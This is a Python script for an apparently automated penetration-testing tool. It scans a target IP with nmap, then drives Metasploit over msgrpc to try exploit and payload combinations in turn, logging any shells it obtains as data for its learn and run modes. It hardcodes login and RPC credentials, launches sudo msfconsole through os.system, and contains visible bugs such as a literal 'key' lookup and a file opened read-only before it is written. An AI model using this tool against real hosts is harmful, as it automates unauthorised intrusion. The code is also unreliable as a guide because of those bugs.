#!/bin/env python
# -*- coding: utf-8 -*-
import os
import json
import codecs
import ipaddress
import pandas as pd
from util import Utilty
from metasploit import Metasploit
from banner import *
from datetime import datetime
import socket
import getpass

def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False

def countnum(exploit_tree, target_tree, service_list):
    ttconut = 0
    ostype = target_tree['os_type']

    for service in service_list:
        module_list = service['exploit']
        for exploit in module_list:
            target_list = exploit_tree[exploit]['target_list']
            service_name = service['prod_name']
            for target in target_list:
                payload_list = exploit_tree[exploit]['targets'][target]
                if service_name != 'unknown':
                    available_actions = env.get_available_actions(payload_list, ostype)
                    ttconut += len(available_actions)
    return ttconut

def session(exploit, target, selected_payload, rhost, port, lhost, ttcount, ttidx):
    message = ''
    session_list = []
    session_info = {}
    sesscsv = {}
    sess_list = []
    done = False
    uuid = ''
    job_id = 0

    job_id, uuid = env.client.execute_module('exploit', exploit, target, selected_payload, rhost, port, lhost)

    if uuid is not None:
        msfcmd = env.check_running_module(job_id, uuid)
        sessions = env.client.get_session_list()
        key_list = sessions.keys()
        keyvalue = list(key_list)
        if len(key_list) != 0:
            for key in key_list:
                session_id = int(key)
                session_type = sessions['key'][b'type'].decode('utf-8')
                session_port = str(sessions[key][b'session_port'])
                session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                session_payload = sessions[key][b'via_payload'].decode('utf-8')
                module_info = env.client.get_module_info('exploit', session_exploit)
                status = True
                if status:
                    # Successful of post-exploitation.
                    done = True
                    message = 'bingo!! '
                    show_bingo()

                    session_info.update({'type':session_type})
                    session_info.update({'port':session_port})
                    session_info.update({'exploit':session_exploit[8:]})
                    session_info.update({'target':target})
                    session_info.update({'payload':session_payload[8:]})
                    session_list.append(session_info)

                    saved_file = os.path.join(env.data_path, 'target_info_' + rhost + '.json')
                    fin = codecs.open(saved_file, 'r', 'utf-8')
                    target_tree = json.loads(fin.read().replace('\0', ''))
                    fin.close()
                    target_tree['session_list'].append(session_info)
                    fout = codecs.open(saved_file, 'w', 'utf-8')
                    json.dump(target_tree, fout, indent=4)
                    fout.close()  
                    
                    sesscsv.update({'exploit':session_exploit[8:]})
                    sesscsv.update({'target':target})
                    sesscsv.update({'payload':session_payload[8:]})

                    fin = codecs.open(os.path.join(env.data_path, 'sesslist.txt'), 'r', 'utf-8')
                    for sess in fin:
                        sess = sess.replace("'", '"')
                        sesslist = json.loads(sess)
                        sess_list.append(sesslist)
                    fin.close()
                    fout = codecs.open(os.path.join(env.data_path, 'sesslist.txt'), 'a', 'utf-8')
                    if sesscsv not in sess_list:
                        fout.write(str(sesscsv) + '\n')
                    fout.close()
                else:
                    # Failure of post-exploitation.
                    message = 'misfire '
                env.client.stop_session(session_id)
                break
        else:
            # Failure exploitation.
            message = 'failure '
    else:
        # Time out or internal error of Metasploit.
        done = True
        message = 'time out'
    # Output result to console. 
    env.util.print_message('ok', '{0}/{1} {2} {3} ({4}:{5}) '
                                '{6} | {7} | {8} '.format(  ttidx,
                                                            ttcount,
                                                            message,
                                                            rhost,
                                                            port,
                                                            lhost,
                                                            target,
                                                            exploit,
                                                            selected_payload))
    if len(keyvalue) != 0:
        env.client.stop_session(keyvalue[0])
    return done, session_list

com_port_list = []
com_exploit_list = []
com_payload_list = []
com_indicate_flag = False

if __name__ == '__main__':
    show_banner()
    id = input('ID: ')
    password = getpass.getpass()
    if id.strip() != 'isystem' or password.strip() != "PassW0rd":
        print('Invalid access')
        exit(1)

    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    st.connect(('10.255.255.255',1))
    server_host = st.getsockname()[0]
    print('load msgrpc ServerHost={0} ServerPort=55553 User=test Pass=test1234'.format(server_host))
    os.system("gnome-terminal --title=isystem --hide-menubar -- /bin/sh -c 'sudo msfdb start; sudo msfconsole -x 'load msgrpc ServerHost={0} ServerPort=55553 User=test Pass=test1234''".format(server_host))
    
    util = Utilty()
    now = datetime.now()
    date = now.strftime("%d%m%Y%H%Y%S")
    rhost = input("Target IP: ")
    mode = input("Mode(learn/run): ")
    if is_valid_ip(rhost) is False:
        util.print_message('fail' , 'Invalid IP address: {}'.format(rhost))
        exit(1)
    if mode not in ['learn', 'run']:
        util.print_message('fail', 'Invalid mode: {}'.format(mode))
        exit(1)

    env = Metasploit(rhost)
    if rhost in env.prohibited_list:
        util.print_message('fail' , 'Target IP={} is prohibited.\n'
                                 '    Please check "config.ini"'.format(rhost))
        exit(1)    
    nmap_result = os.getcwd() + '/nmap_result_' + env.rhost + '.xml'
    nmap_command = env.nmap_command + ' ' + nmap_result + ' ' + env.rhost + '\n'

    com_port_list, proto_list, info_list = env.get_port_list(env.rhost, nmap_command, env.nmap_timeout, nmap_result)
    com_exploit_list = env.get_exploit_list()
    com_payload_list = env.get_payload_list()
    com_payload_list.append('no payload')

    exploit_tree = env.get_exploit_tree()
    target_tree = env.get_target_info(rhost, proto_list, info_list)    

    service_list = target_tree['service_list']
    port_list = target_tree['opened_port_list']
    vuln_list = target_tree['vulns']
    sess_list = []

    if len(service_list) == 0:
        util.print_message('warn', 'No open service.')
        util.print_message('warn', 'Shutdown Exploit Expert...')
        exit(1)
    elif mode == 'run':
        fin = codecs.open(os.path.join(env.data_path, 'sesslist.txt'), 'r', 'utf-8')
        for sess in fin:
            sess = sess.replace("'", '"')
            sesslist = json.loads(sess)
            sess_list.append(sesslist)
        fin.close()

        for sess in sess_list:
            for service in service_list:
                if sess['prod_name'] == service['prod_name']:
                    env.moderun(sess['exploit'], sess['target'], sess['payload'], service)
        exit(1)
    else:
        learnmode = input('learn mode(full/custom/vuln): ')
        if learnmode == 'full':
            ttcount = countnum(exploit_tree, target_tree, service_list)
            for idx,service in enumerate(service_list):
                sess_info = env.run(exploit_tree, target_tree, idx, ttcount)
        elif learnmode == 'custom':
            new_list = []
            print("pick the service yoru want to learn:")
            for idx,service in enumerate(service_list):
                print(idx+1, service['prod_name'])
            cus_str = input('select the number: ')
            cus_list = cus_str.split(",")
            for cus in cus_list:
                new_list.append(service_list[int(cus)-1])
            ttcount = countnum(exploit_tree, target_tree, new_list)
            for cus in cus_list:
                sess_info = env.run(exploit_tree, target_tree, int(cus)-1, ttcount)
        elif learnmode == 'vuln':
            ttcount = 0
            selected_payload = ''
            local_file = os.path.join(env.data_path, 'payload_list.csv')
            com_payload_list = []
            fin = codecs.open(local_file, 'r', 'utf8')
            for item in fin:
                com_payload_list.append(item.rstrip('\n'))
            fin.close()
            ostype = target_tree['os_type']
            module_list = target_tree['vulns']
            p = 1
            for vuln in module_list:
                if vuln['port'] is None:
                    p += 1
            for vuln in module_list:
                for exploit in vuln['exploit']:
                    target_list = exploit_tree[exploit]['target_list']
                    for target in target_list:
                        payload_list = exploit_tree[exploit]['targets'][target]
                        available_actions = env.get_available_actions(payload_list, ostype)
                        ttcount += len(available_actions)
            ttcount = ttcount*p
            fin = codecs.open(os.path.join(env.data_path, 'count.txt'), 'r, utf-8')
            ttidx = int(fin.read())
            fin.close()
            for vuln in module_list:
                for exploit in vuln['exploit']:
                    target_list = exploit_tree[exploit]['target_list']
                    for target in target_list:
                        payload_list = exploit_tree[exploit]['targets'][target]
                        available_actions = env.get_available_actions(payload_list, ostype)
                        for action in available_actions:
                            selected_payload = com_payload_list[action]
                            if vuln['port'] is None:
                                for port in target_tree['opened_port_list']:
                                    done, sess_info = session(exploit, target, selected_payload, rhost, port, env.lhost, ttcount, ttidx)
                            else:
                                done, sess_info = session(exploit, target, selected_payload, rhost, port, env.lhost, ttcount, ttidx)
                            ttidx += 1
                            finish_time = (ttcount-ttidx)*5
                            h = int(finish_time / 3600)
                            m = int(finish_time / 60) % 60
                            s = finish_time % 60
                            print('finish in arround {0}h{1}m{2}s'.format(h,m,s))
                            if done is True:
                                break
            fout = codecs.open(os.path.join(env.data_path, 'count.txt'), 'r, utf-8')
            fout.write(str(ttidx))
            fout.close()
        else:
            print('wrong input')
            exit(1)
    
    saved_file = os.path.join(env.data_path, 'target_info_' + rhost + '.json')
    fin = codecs.open(saved_file, 'r', 'utf-8')
    target_tree = json.loads(fin.read().replace('\0', ''))
    fin.close()

    target_tree.update({'session_reverse':len(target_tree['session_list'])})
    if len(target_tree['session_list']) == 0:
        target_tree.update({'exploit_sucess':False})
    else:
        target_tree.update({'exploit_sucess':True})
        
    fout = codecs.open(saved_file, 'w', 'utf-8')
    json.dump(target_tree, fout, indent=4)
    fout.close()  
   
    del target_tree['rhost']
    for service in target_tree['service_list']:
        del service['port']
    target_tree_csv = pd.DataFrame([target_tree])
    target_tree_csv.to_csv(os.path.join(env.data_path, 'target_dataset.csv'), mode='a', header=False, index=False)
    util.print_message('ok', 'Saved target_dataset.csv')

    newpath = env.data_path+"/olddata"
    if os.path.isdir(newpath) is False:
        os.mkdir(newpath)

    os.system("mv " + os.path.join(env.data_path, 'target_info_' + rhost + '.json') + " " +newpath)
    os.system("mv " + os.path.join(newpath, 'target_info_' + rhost + '.json') + " " +os.path.join(newpath, 'target_info_'+rhost+date+'.json'))
